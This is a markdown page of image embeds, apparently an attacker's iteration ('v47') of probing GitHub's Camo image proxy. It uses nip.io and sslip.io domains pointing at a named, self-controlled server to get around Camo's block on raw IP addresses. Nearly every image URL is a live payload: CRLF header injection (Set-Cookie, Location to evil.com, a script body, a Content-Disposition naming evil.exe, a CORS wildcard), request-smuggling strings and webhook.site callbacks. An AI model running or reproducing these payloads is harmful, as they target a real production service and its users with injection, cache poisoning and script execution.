# v47: nip.io Domain Bypass + CRLF Response Splitting

> **KEY FINDING**: GitHub Camo BLOCKS direct IP addresses but allows domain names.
> Using nip.io to create domains that resolve to our server: `164.90.187.218.nip.io`

---

## 1. nip.io IP Bypass Tests

### Basic - nip.io resolving to our server
![nip test](http://164.90.187.218.nip.io:8888/nip-basic.gif)

### CRLF Set-Cookie via nip.io
![nip cookie](http://164.90.187.218.nip.io:8888/img.gif%0d%0aSet-Cookie:evil=1)

### CRLF Content-Type via nip.io
![nip ct](http://164.90.187.218.nip.io:8888/img.gif%0d%0aContent-Type:text/html)

### CRLF Location redirect via nip.io
![nip redir](http://164.90.187.218.nip.io:8888/img.gif%0d%0aLocation:http://evil.com)

### Double CRLF body injection via nip.io
![nip body](http://164.90.187.218.nip.io:8888/img.gif%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E)

---

## 2. Alternative IP-to-Domain Services

### sslip.io (another IP wildcard DNS)
![sslip](http://164-90-187-218.sslip.io:8888/sslip-test.gif)

### xip.io (legacy, may still work)
![xip](http://164.90.187.218.xip.io:8888/xip-test.gif)

---

## 3. HTTP Request Smuggling via Domain

### CL.TE attempt via nip.io
![smuggle1](http://164.90.187.218.nip.io:8888/img.gif%20HTTP/1.1%0d%0aHost:internal%0d%0aContent-Length:0%0d%0a%0d%0aGET%20/admin)

### Double Host header injection
![dblhost](http://164.90.187.218.nip.io:8888/img.gif%0d%0aHost:evil.com)

### X-Forwarded-Host injection
![xfh](http://164.90.187.218.nip.io:8888/img.gif%0d%0aX-Forwarded-Host:127.0.0.1)

---

## 4. Port Variations via nip.io

### Port 80 (standard HTTP)
![port80](http://164.90.187.218.nip.io/port80-test.gif)

### Port 8080 (common alt port)
![port8080](http://164.90.187.218.nip.io:8080/port8080-test.gif)

### Port 443 as HTTP (not HTTPS)
![port443http](http://164.90.187.218.nip.io:443/port443http.gif)

---

## 5. Subdomain Variations

### Subdomain before IP
![subdom1](http://test.164.90.187.218.nip.io:8888/subdomain-test.gif)

### Multiple subdomains
![subdom2](http://a.b.c.164.90.187.218.nip.io:8888/multi-subdomain.gif)

### Hyphenated IP format (sslip.io style)
![hyphen](http://164-90-187-218.sslip.io:8888/hyphen-format.gif)

---

## 6. Control Tests

### Webhook.site control (should always work)
![control](https://webhook.site/f9880a9d-a4ca-4ed8-a559-f066430098db/v47-control.gif)

### HTTP webhook (vs HTTPS)
![http-control](http://webhook.site/f9880a9d-a4ca-4ed8-a559-f066430098db/v47-http.gif)

---

## 7. Advanced CRLF Payloads via nip.io

### Triple header injection
![triple](http://164.90.187.218.nip.io:8888/x%0d%0aSet-Cookie:a=1%0d%0aSet-Cookie:b=2%0d%0aX-Custom:pwned)

### Cache-Control manipulation
![cache](http://164.90.187.218.nip.io:8888/x%0d%0aCache-Control:no-store%0d%0aX-Cache-Status:bypass)

### Access-Control (CORS) injection
![cors](http://164.90.187.218.nip.io:8888/x%0d%0aAccess-Control-Allow-Origin:*)

### Content-Disposition for download
![download](http://164.90.187.218.nip.io:8888/x%0d%0aContent-Disposition:attachment;filename=evil.exe)

---

**v47** - Testing nip.io IP bypass to use controlled server for CRLF response analysis

Server: `164.90.187.218:8888` (PH4N70M droplet)
Logs: `/tmp/server.log`
